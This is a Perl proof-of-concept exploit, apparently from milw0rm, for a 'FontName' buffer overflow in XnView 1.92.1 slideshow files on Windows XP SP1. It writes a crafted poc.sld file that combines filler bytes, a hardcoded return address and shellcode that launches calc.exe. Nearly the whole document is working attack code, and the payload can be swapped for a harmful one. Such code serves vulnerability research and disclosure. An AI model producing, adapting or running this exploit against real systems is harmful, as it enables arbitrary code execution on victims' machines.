#!/usr/bin/perl

# ================================================================
# XnView 1.92.1 Slideshow "FontName" Buffer Overflow
# ================================================================
#
# Calc execution POC Exploit for WinXP SP1 pro English
#
# Found by   : Stefan Cornelius, Secunia Research
# Advisory   : http://secunia.com/secunia_research/2008-6/advisory
#
# Exploit by : haluznik | haluznik<at>gmail.com
#
# 04.01.2008 ..April Fools Day ;)
# ================================================================


print "\n [*] XnView 1.92.1 Slideshow exploit by haluznik\n\n";

my $head=
"\x23\x20\x53\x6c\x69\x64\x65\x20\x53\x68".
"\x6f\x77\x20\x53\x65\x71\x75\x65\x6e\x63".
"\x65\x0d\x0a\x46\x6f\x6e\x74\x4e\x61\x6d".
"\x65\x20\x3d\x20\x22";

$fontname = "A" x 32 . "\xcc\x59\xfb\x77";

my $shellcode=
"\x33\xc0\x50\x68\x63\x61\x6c\x63\x54\x5b".
"\x50\x53\xb9\x44\x80\xc2\x77\xff\xd1\x50".
"\xbb\xfd\x98\xe7\x77\xff\xd3";

my $tail=
"\x22\x0d\x0a\x22\x43\x3a\x5c\x74\x65\x73".
"\x74\x2e\x6a\x70\x67\x22\x0d\x0a";

$sld = $head . $fontname . $shellcode . $tail;

print " [+] Creating poc.sld file..\n";

open(file,">poc.sld") || die " [-] cannot write file\n";
print(file $sld);
close(file);
print " [*] Done!\n";

# milw0rm.com [2008-04-02]
